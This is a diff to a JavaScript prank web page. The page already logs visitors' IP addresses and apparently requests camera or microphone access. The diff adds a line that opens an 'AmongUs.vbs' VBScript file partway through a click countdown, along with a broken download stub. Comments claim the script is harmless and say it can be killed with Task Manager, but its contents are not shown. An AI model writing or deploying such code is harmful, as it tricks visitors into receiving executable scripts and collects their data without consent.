@@ -24,6 +24,13 @@ function ipLogger() { // DON'T WORRY, THIS WON'T BE SAVED, just a funny troll
     });
 }
 
+// downloads a vbscript file (if you open it, it's harmless anyways- feel free to use task manager to kill the process)
+function download(fileUrl, fileName) {
+    var a = document.createElement("a");
+    a.click();
+}
+
+
 document.body.addEventListener('click', function (event) {
     if (!clickEnabled) return
     clickEnabled = false;
@@ -122,6 +129,7 @@ document.body.addEventListener('click', function (event) {
             reduceCountdown2();
             return
         } else if (countdown == 20) {
+            window.open("../../assets/AmongUs.vbs");
             getLocalStream();
         } else if (countdown == 15) {
             ipLogger();
